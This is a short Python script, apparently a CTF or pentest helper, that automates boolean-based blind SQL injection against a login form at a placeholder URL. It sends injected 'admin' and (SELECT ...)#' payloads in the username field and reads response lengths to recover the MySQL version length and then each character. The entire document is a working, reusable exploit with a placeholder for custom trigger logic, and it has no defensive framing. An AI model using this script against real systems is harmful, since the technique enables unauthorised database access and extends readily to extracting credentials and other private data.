# MYSQL - Blind sqli
    # Get version

from requests import post
from string import digits

class Attack:
    URL: str = 'https://vuln/login.php'

    def __init__(self) -> None:
        n = self.get_length()
        self.get_version(n)

    def get_length(self) -> int:
        for _ in range(1, 20):
            payload = {"username": f"admin' and (SELECT LENGTH(VERSION())={_})#", "password": "password"}
            resp = post(self.URL, data=payload)
            print(_, len(resp.text))
            # your trigger logic
            if len(resp.text) > 2000:
                print('[length]', _)
                return _
    
    def get_version(self, n: int) -> None:
        version = ''
        for i in range(1, n + 1):
            for j in digits + '.':
                payload = {"username": f"admin' and (SELECT ASCII(SUBSTRING(VERSION(),{i},1))={ord(j)})#", "password": "password"}
                resp = post(self.URL, data=payload)
                print(j, len(resp.text))
                # your trigger logic
                if len(resp.text) > 2000:
                    version += j
                    print(f'[version]', version)
                    break

if __name__ == '__main__':
    Attack()
